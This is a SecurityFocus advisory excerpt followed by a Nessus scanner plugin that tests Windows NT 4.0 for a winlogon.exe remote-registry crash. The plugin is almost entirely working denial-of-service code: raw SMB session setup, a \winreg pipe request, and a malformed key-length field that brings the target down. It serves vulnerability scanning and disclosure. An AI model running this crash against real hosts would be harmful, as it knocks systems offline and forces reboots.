source: http://www.securityfocus.com/bid/1331/info
 
In special circumstances while handling requests to access the Remote Registry Server, Windows NT 4.0 can crash due to winlogon.exe's inability to process specially malformed remote registry requests. Rebooting the machine would be required in order to regain normal functionality.
 
Only authenticated users on the network would be able to exploit this vulnerability. If Windows NT was configured to deny all remote registry requests, it would not be affected by this vulnerability under any conditions.

#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10414);
 script_cve_id("CAN-2000-0377");
 name["english"] = "WinLogon.exe DoS";
 name["francais"] = "Dini de service WinLogon.exe";
 
 script_name(english:name["english"],
             francais:name["francais"]);
 
 desc["english"] = "

It seems that is was possible to crash remotely 
winlogon.exe by sending a malformed request to
access the registry of the remote host. 

As soon as you validate the error box, the host 
will reboot.


Solution : apply hotfix Q264684

Risk factor : High

See also : http://www.microsoft.com/technet/security/bulletin/ms00-040.asp";


 desc["francais"] = "
 
Il semble qu'il ait iti possible de faire
planter le programme WinLogon.exe en lui
envoyant une requhte mal formie pour accider
` sa base de registres.

Dhs que vous validerez la boite de dialogue,
l'hote distant redimarrera.

Solution : appliquez le hotfix Q264684

Facteur de risque : Elevi

Voir aussi : http://www.microsoft.com/technet/security/bulletin/ms00-040.asp";


 script_description(english:desc["english"],
                    francais:desc["francais"]);
 
 summary["english"] = "crashes winlogon.exe";
 summary["francais"] = "fait planter winlogon.exe";
 script_summary(english:summary["english"],
                francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Dini de service";
 script_family(english:family["english"], francais:family["francais"]);
 
 script_dependencies("netbios_name_get.nasl",
                     "smb_login.nasl");
 script_require_keys("SMB/name", "SMB/login", "SMB/password");
 script_require_ports(139);
 exit(0);
}


#-----------------------------------------------------------------#
# Convert a netbios name to the netbios network format            #
#-----------------------------------------------------------------#
function netbios_name(orig)
{
 ret = "";
 len = strlen(orig);
 for(i=0;i<16;i=i+1)
 {
   if(i >= len)
   {
     c = "CA";
   }
   else
   {
     o = ord(orig[i]);
     odiv = o/16;
     odiv = odiv + ord("A");
     omod = o%16;
     omod = omod + ord("A");
     c = raw_string(odiv, omod);
   }
 ret = ret+c;
 }
 return(ret); 
}

#--------------------------------------------------------------#
# Returns the netbios name of a redirector                     #
#--------------------------------------------------------------#

function netbios_redirector_name()
{
 ret = crap(data:"CA", length:30);
 ret = ret+"AA";
 return(ret); 
}

#-------------------------------------------------------------#
# return a 28 + strlen(data) + (odd(data)?0:1) long string    #
#-------------------------------------------------------------#
function unicode(data)
{
 len = strlen(data);
 ret = raw_string(ord(data[0]));
 
 for(i=1;i<len;i=i+1)
 {
  ret = string(ret, raw_string(0, ord(data[i])));
 }
 
 
 if(!(len & 1)){even = 1;}
 else even = 0;
 

 for(i=0;i<7;i=i+1)
  ret = ret + raw_string(0);
  
  
 if(even)
  {
  ret = ret + raw_string(0x00, 0x00, 0x19, 0x00, 0x02, 0x00);
  }
 else
  ret = ret + raw_string(0x19, 0x00, 0x02, 0x00);
 
  
 return(ret);
}


function unicode2(data)
{
 len = strlen(data);
 ret = raw_string(0, ord(data[0]));
 
 for(i=1;i<len;i=i+1)
 {
  ret = ret + raw_string(0, ord(data[i]));
 }
 if(len & 1)ret = ret + raw_string(0x00, 0x00); 
 else ret = ret + raw_string(0x00, 0x00, 0x00, 0x63);
 return(ret);
}

#----------------------------------------------------------#
# Request a new SMB session                                #
#----------------------------------------------------------#
function smb_session_request(soc, remote)
{
 nb_remote = netbios_name(orig:remote);
 nb_local  = netbios_redirector_name();
 
 session_request = raw_string(0x81, 0x00, 0x00, 0x48) + 
                  raw_string(0x20) + 
                  nb_remote +
                  raw_string(0x00, 0x20)    + 
                  nb_local  + 
                  raw_string(0x00);

 send(socket:soc, data:session_request);
 r = recv(socket:soc, length:4000);
 if(ord(r[0])==0x82)return(r);
 else return(FALSE);
}

#------------------------------------------------------------#
# Extract the UID from the result of smb_session_setup()     #
#------------------------------------------------------------#

function session_extract_uid(reply)
{
 low = ord(reply[32]);
 high = ord(reply[33]);
 ret = high * 256;
 ret = ret + low;
 return(ret);
}



#-----------------------------------------------------------#
# Negociate (pseudo-negociate actually) the protocol        #
# of the session                                            #
#-----------------------------------------------------------#


function smb_neg_prot(soc)
{
 neg_prot = raw_string
        (
         0x00,0x00,
         0x00, 0x89, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00,
         0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x66, 0x00, 0x02, 0x50, 0x43,
         0x20, 0x4E, 0x45, 0x54, 0x57, 0x4F, 0x52, 0x4B,
         0x20, 0x50, 0x52, 0x4F, 0x47, 0x52, 0x41, 0x4D,
         0x20, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4D, 0x49,
         0x43, 0x52, 0x4F, 0x53, 0x4F, 0x46, 0x54, 0x20,
         0x4E, 0x45, 0x54, 0x57, 0x4F, 0x52, 0x4B, 0x53,
         0x20, 0x31, 0x2E, 0x30, 0x33, 0x00, 0x02, 0x4D,
         0x49, 0x43, 0x52, 0x4F, 0x53, 0x4F, 0x46, 0x54,
         0x20, 0x4E, 0x45, 0x54, 0x57, 0x4F, 0x52, 0x4B,
         0x53, 0x20, 0x33, 0x2e, 0x30, 0x00, 0x02, 0x4c,
         0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x31, 0x2e, 0x30,
         0x00, 0x02, 0x4c, 0x4d, 0x31, 0x2e, 0x32, 0x58,
         0x30, 0x30, 0x32, 0x00, 0x02, 0x53, 0x61, 0x6d,
         0x62, 0x61, 0x00
         );
         
 send(socket:soc, data:neg_prot);
 r = recv(socket:soc, length:4000);
 if(!r)return(FALSE);
 if(ord(r[9])==0)return(r);
 else return(FALSE);
}
 

#------------------------------------------------------#
# Set up a session                                     #
#------------------------------------------------------#
function smb_session_setup(soc, login, password)
{

  len = strlen(login) + strlen(password) + 57;
  bcc = 2 + strlen(login) + strlen(password);
  
  len_hi = len / 256;
  len_low = len % 256;
  
  bcc_hi = bcc / 256;
  bcc_lo = bcc % 256;
  
  pass_len = strlen(password) + 1 ;
  pass_len_hi = pass_len / 256;
  pass_len_lo = pass_len % 256;
  
  st = raw_string(0x00,0x00,
          len_hi, len_low, 0xFF, 0x53, 0x4D, 0x42, 0x73, 0x00,
          0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00,
          0x00, 0x00, 0x0A, 0xFF, 0x00, 0x00, 0x00, 0x04,
          0x11, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, pass_len_lo,  pass_len_hi, 0x00, 0x00, 0x00, 0x00, bcc_lo,
          bcc_hi) + password + raw_string(0) + login + raw_string(0x00);
         
         
  send(socket:soc, data:st);
  r = recv(socket:soc, length:1024); 
  if(!r)return(FALSE);
  if(ord(r[9])==0)return(r);
  else return(FALSE);
}        
#------------------------------------------------------#
# connection to the remote IPC share                   #
#------------------------------------------------------#                
function smb_tconx(soc,name,uid)
{

 
 high = uid / 256;
 low = uid % 256;
  
 len = 55 + strlen(name) + 1;
 ulen = 13 + strlen(name);
 
 
 req = raw_string(0x00, 0x00,
                  0x00, len, 0xFF, 0x53, 0x4D, 0x42, 0x75, 0x00,
                  0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x28, low, high,
                  0x00, 0x00, 0x04, 0xFF, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x01, 0x00, ulen, 0x00, 0x00, 0x5C, 0x5C) +
        name +
        raw_string(0x5C, 0x49,
                   0x50, 0x43, 0x24, 0x00, 0x49, 0x50, 0x43, 0x00);
 send(socket:soc, data:req);
 r = recv(socket:soc, length:4000);
 if(!r)return(FALSE);
 if(ord(r[9])==0)return(r);
 else return(FALSE);                     

}

#------------------------------------------------------#
# Extract the TID from the result of smb_tconx()       #
#------------------------------------------------------#
function tconx_extract_tid(reply)
{
 low = ord(reply[28]);
 high = ord(reply[29]);
 ret = high * 256;
 ret = ret + low;
 return(ret);
}


#--------------------------------------------------------#
# Request the creation of a pipe to winreg. We will      #
# then use it to do our work                             #
#--------------------------------------------------------#
function smbntcreatex(soc, uid, tid)
{
 tid_high = tid / 256;
 tid_low  = tid % 256;
 
 uid_high = uid / 256;
 uid_low  = uid % 256;
 
  req = raw_string(0x00, 0x00,
                   0x00, 0x5B, 0xFF, 0x53, 0x4D, 0x42, 0xA2, 0x00,
                   0x00, 0x00, 0x00, 0x18, 0x03, 0x00, 0x50, 0x81,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x00, tid_low, tid_high, 0x00, 0x28, uid_low, uid_high,
                   0x00, 0x00, 0x18, 0xFF, 0x00, 0x00, 0x00, 0x00,
                   0x07, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x00, 0x9F, 0x01, 0x02, 0x00, 0x00, 0x00,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00,
                   0x00, 0x00, 0x00, 0x08, 0x00, 0x5C, 0x77, 0x69,
                   0x6e, 0x72, 0x65, 0x67, 0x00);

 send(socket:soc, data:req);
 r = recv(socket:soc, length:4000);
 if(!r)return(FALSE);
 if(ord(r[9])==0x00)return(r);
 else return(FALSE);
}


#--------------------------------------------------------#
# Extract the ID of our pipe from the result             #
# of smbntcreatex()                                      #
#--------------------------------------------------------#

function smbntcreatex_extract_pipe(reply)
{
 low = ord(reply[42]);
 high = ord(reply[43]);
 
 ret = high * 256;
 ret = ret + low;
 return(ret);
}



#---------------------------------------------------------#
# Determines whether the registry is accessible           #
#---------------------------------------------------------#
                
function pipe_accessible_registry(soc, uid, tid, pipe)
{
 tid_low = tid % 256;
 tid_high = tid / 256;
 uid_low = uid % 256;
 uid_high = uid / 256;
 pipe_low = pipe % 256;
 pipe_high = pipe / 256;
 
 req = raw_string(0x00, 0x00,
                  0x00, 0x94, 0xFF, 0x53, 0x4D, 0x42, 0x25, 0x00,
                  0x00, 0x00, 0x00, 0x18, 0x03, 0x00, 0x1B, 0x81,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, tid_low, tid_high, 0x00, 0x28, uid_low, uid_high,
                  0x00, 0x00, 0x10, 0x00, 0x00, 0x48, 0x00, 0x00,
                  0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C,
                  0x00, 0x48, 0x00, 0x4C, 0x00, 0x02, 0x00, 0x26,
                  0x00, pipe_low, pipe_high, 0x51, 0x00, 0x5C, 0x50, 0x49,
                  0x50, 0x45, 0x5C, 0x00, 0x00, 0x00, 0x05, 0x00,
                  0x0B, 0x00, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x16,
                  0x30, 0x16, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0xd0,
                  0x8c, 0x33, 0x44, 0x22, 0xF1, 0x31, 0xAA, 0xAA,
                  0x90, 0x00, 0x38, 0x00, 0x10, 0x03, 0x01, 0x00,
                  0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C,
                  0xc9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10,
                  0x48, 0x60, 0x02, 0x00, 0x00, 0x00);    
 send(socket:soc, data:req);
 r = recv(socket:soc, length:4096);
 if(!r)return(FALSE);
 if(ord(r[9])==0)return(r);
 else return(FALSE);
}


#----------------------------------------------------------#
# Step 1                                                   #
#----------------------------------------------------------#

function registry_access_step_1(soc, uid, tid, pipe)
{
 tid_low = tid % 256;
 tid_high = tid / 256;
 uid_low = uid % 256;
 uid_high = uid / 256;
 pipe_low = pipe % 256;
 pipe_high = pipe / 256;
 
 req = raw_string(0x00, 0x00,
                  0x00, 0x78, 0xFF, 0x53, 0x4D, 0x42, 0x25, 0x00,
                  0x00, 0x00, 0x00, 0x18, 0x03, 0x80, 0x1D, 0x83,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, tid_low, tid_high, 0x00, 0x28, uid_low, uid_high,
                  0x00, 0x00, 0x10, 0x00, 0x00, 0x24, 0x00, 0x00,
                  0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54,
                  0x00, 0x24, 0x00, 0x54, 0x00, 0x02, 0x00, 0x26,
                  0x00, pipe_low, pipe_high, 0x35, 0x00, 0x00, 0x5c, 0x00,
                  0x50, 0x00, 0x49, 0x00, 0x50, 0x00, 0x45, 0x00,
                  0x5C, 0x00, 0x00, 0x00, 0x00, 0x5c, 0x05, 0x00,
                  0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0x24, 0x00,
                  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x10, 0xFF,
                  0x12, 0x00, 0x30, 0x39, 0x01, 0x00, 0x00, 0x00,
                  0x00, 0x02);
                  

 send(socket:soc, data:req);
 r = recv(socket:soc, length:4096);
 if(!r)return(FALSE);
 if(ord(r[9])==0)return(r);
 else return(FALSE);
}


#---------------------------------------------------------------------#
# Get the key                                                         #
#                                                                     #
# This is the function that makes winlogon.exe crash                  #
#                                                                     #
#---------------------------------------------------------------------#
                 
function crash_winlogon(soc, uid, tid, pipe, key, reply)
{
 key_len = strlen(key) + 1;
 key_len_hi = key_len / 256;
 key_len_lo = key_len % 256;
 
 
 
 tid_low = tid % 256;
 tid_high = tid / 256;
 uid_low = uid % 256;
 uid_high = uid / 256;
 pipe_low = pipe % 256;
 pipe_high = pipe / 256;
 uc = unicode(data:key);
 
 len = 148 + strlen(uc);
 
 len_hi = len / 256;
 len_lo = len % 256;
 
 
 z = 40 + strlen(uc);
 z_lo = z % 256;
 z_hi = z / 256;
 
 y = 81 + strlen(uc);
 y_lo = y % 256;
 y_hi = y / 256;
 
 x = 64 + strlen(uc);
 x_lo = x % 256;
 x_hi = x / 256;
 
 magic1 = raw_string(ord(reply[16]), ord(reply[17]));
 
 req = raw_string(0x00, 0x00,
                  len_hi, len_lo, 0xFF, 0x53, 0x4D, 0x42, 0x25, 0x00,
                  0x00, 0x00, 0x00, 0x18, 0x03, 0x80)
                  +
                  magic1 +
                 raw_string(
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00,tid_low, tid_high, 0x00, 0x28, uid_low, uid_high,
                  0x00, 0x00, 0x10, 0x00, 0x00, x_lo, x_hi, 0x00,
                  0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54,
                  0x00, x_lo, x_hi, 0x54, 0x00, 0x02, 0x00, 0x26,
                  0x00, pipe_low, pipe_high, y_lo, y_hi, 0x00, 0x5C, 0x00,
                  0x50, 0x00, 0x49, 0x00, 0x50, 0x00, 0x45, 0x00,
                  0x5C, 0x00, 0x00, 0x00, 0x00, 0xb9, 0x05, 0x00,
                  0x00, 0x03, 0x10, 0x00, 0x00, 0x00, x_lo, x_hi,
                  0x00, 0x00, 0x02, 0x00, 0x00, 0x00, z_lo, z_hi,
                  0x00, 0x00, 0x00, 0x00, 0x0F, 0x00);
                  
 magic = raw_string(ord(reply[84]));
 for(i=1;i<20;i=i+1)
 {
  magic = magic + raw_string(ord(reply[84+i]));
 }
 
 #
 # THE PROBLEM IS HERE : We declare the length of our
 # key as a WAYYY too long value
 #
 x = 65535;
 #   ^^^^^^
 
 x_lo = x % 256;
 x_hi = x / 256;
 
 req = req + magic + raw_string(x_lo, x_hi, 0x0A, 0x02, 0x00, 0xEC,
                0xFD, 0x7F, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, key_len_lo, key_len_hi, 0x00, 0x00) +
                uc;
                  

 send(socket:soc, data:req);
 r = recv(socket:soc, length:4096);
 if(!r)return(TRUE);
 else return(FALSE);
}


#---------------------------------------------------------------------#
# crash()                                                             #
#---------------------------------------------------------------------#


function crash(key, item)
{

name = get_kb_item("SMB/name"); 
if(!name)return(FALSE);


if(!get_port_state(139))return(FALSE);


login = get_kb_item("SMB/login");
pass = get_kb_item("SMB/password");

if(!login)login = "";
if(!pass) pass = "";

          
soc = open_sock_tcp(139);

#
# Request the session
# 
r = smb_session_request(soc:soc,  remote:name);
if(!r)return(FALSE);

#
# Negociate the protocol
#
if(!smb_neg_prot(soc:soc))return(FALSE);

#
# Set up our session
#
r = smb_session_setup(soc:soc, login:login, password:pass);
if(!r)return(FALSE);
# and extract our uid
uid = session_extract_uid(reply:r);

#
# Connect to the remote IPC and extract the TID
# we are attributed
#      
r = smb_tconx(soc:soc, name:name, uid:uid);
# and extract our tree id
tid = tconx_extract_tid(reply:r);


#
# Create a pipe to \winreg
#
r = smbntcreatex(soc:soc, uid:uid, tid:tid);
if(!r)return(FALSE);
# and extract its ID
pipe = smbntcreatex_extract_pipe(reply:r);

#
# Setup things
#
r = pipe_accessible_registry(soc:soc, uid:uid, tid:tid, pipe:pipe);
if(!r)return(FALSE);
r = registry_access_step_1(soc:soc, uid:uid, tid:tid, pipe:pipe);
if(!r)return(FALSE);
r2 = crash_winlogon(soc:soc, uid:uid, tid:tid, pipe:pipe, key:key, reply:r);
return(r2);
}

#---------------------------------------------------------------------#
# Here is our main()                                                  #
#---------------------------------------------------------------------#

#
# This is bogus - whatever value will just do
#
key = "x";
item = "";

for(counter=0;counter<10;counter=counter+1)
{
value = crash(key:key, item:item);
if(value)
  {
  security_hole(139);
  exit(0);
  }
}